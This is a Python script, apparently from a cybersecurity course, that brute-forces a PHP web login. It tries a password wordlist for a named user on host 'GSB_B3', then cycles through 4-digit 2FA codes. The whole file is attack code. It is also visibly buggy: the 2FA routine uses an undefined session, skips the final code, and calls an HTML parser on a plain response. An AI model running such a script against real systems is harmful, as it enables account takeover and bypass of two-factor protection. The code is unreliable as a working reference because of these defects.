import requests
from requests_html import HTMLSession
import base64
#import time

class Bruteforcer() :
    def __init__(self, wordlist, hostname, url, uri='/'):
        self.wordlist = wordlist
        self.hostname = hostname
        self.url = url
        self.uri = uri
        self.hyperlink = self.url + self.uri

    # Informe du code HTTP reçu
    def getHTTPCode(self, requete):
        codeHTTP = requete.status_code
        print(codeHTTP)
        return codeHTTP

    # Vérifie si on a été redirigé vers une autre page
    def haveIBeenRedirected(self, requete):
        print(requete.history)
        self.getHTTPCode(requete)

    # Méthode appelée pour tenter de se connecter
    # Session() ajoute de la persistence en cas de réussite
    def authenticate(self):
        continuer = True
        with requests.Session() as s :
            # header = self.getHeader()
            while continuer :
                with open(self.wordlist, 'r') as passwordList:
                    for passwd in passwordList :
                        passwd = passwd.replace("\n", "")
                        print("Tentative avec le mot de passe : " + passwd)
                        payload = self.getPayload('lvillachane', passwd)
                        requeteHTTP = requests.post(self.hyperlink, data=payload)
                        #print(requeteHTTP)
                        #print(requeteHTTP.text)
                        #self.haveIBeenRedirected(requeteHTTP)
                        if 'code à 4 chiffres' in requeteHTTP.text :
                            print("\nMot de passe trouvé : " + passwd)
                            continuer = False
                            self.bruteforce2FA()
                            break

    def bruteforce2FA(self) :
        for i in range(1000, 9999):
            code = {
                'code': i
            }
            # On teste le code
            p = s.post('http://GSB_B3/index.php?uc=connexion&action=valideA2fConnexion', data=code)
            # On essaye de récupérer la page d'accueil
            r = s.get('http://GSB_B3/index.php', data=code)
            elHTML = r.html.find('.glyphicon-home', first=True)
            # Est-ce que l'on est connecté ?
            if elHTML is not None:
                print("Le code est : ",i)
                # On s'arrête lorsque c'est trouvé !
                break


    """
    # Essaie de créer un header HTTP pour une requête
    def getHeader(self):
        header = {
            "POST": self.uri + " HTTP/1.1",
            "Host:": self.hostname,
            "Content-Length:": 33,
            "Cache-Control:": "max-age=0",
            "Upgrade-Insecure-Requests:": 1,
            "Origin:": "http://" + self.hostname,
            "Content-Type:": "application/x-www-form-urlencoded",
            "User-Agent:": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",
            "Accept:": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Referer:": "http://" + self.hostname,
            "Accept-Encoding:": "gzip, deflate",
            "Accept-Language:": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
            "Cookie:": "PHPSESSID=qvaeretob5f41lf0iljckca0co",
            "Connection:": "close"
        }
        header = self.base64eur(True, header)
        return header
    """

    # Servira pour la requête HTTP servant à la connexion
    def getPayload(self, username, password):
        payload = {
            'login': username,
            'mdp': password
        }
        return payload

    # Ouvre et traite chaque mot du dictionnaire
    def getWords(self):
        with open(self.wordlist, 'r') as f:
            raw_words = f.read()
        return raw_words

    # Encode si bool = true, sinon décode (base64)
    def base64eur(self, bool, data):
        if bool :
            data = base64.b64encode(data)
        else :
            data = base64.b64decode(data)
        return data



brute = Bruteforcer('C:/Users/adrien.dodero/Desktop/Cours/Cyber/Lernaen-Hydra/resources/passwords.txt', 'GSB_B3', 'http://GSB_B3', '/index.php?uc=connexion&action=valideConnexion')
brute.authenticate()
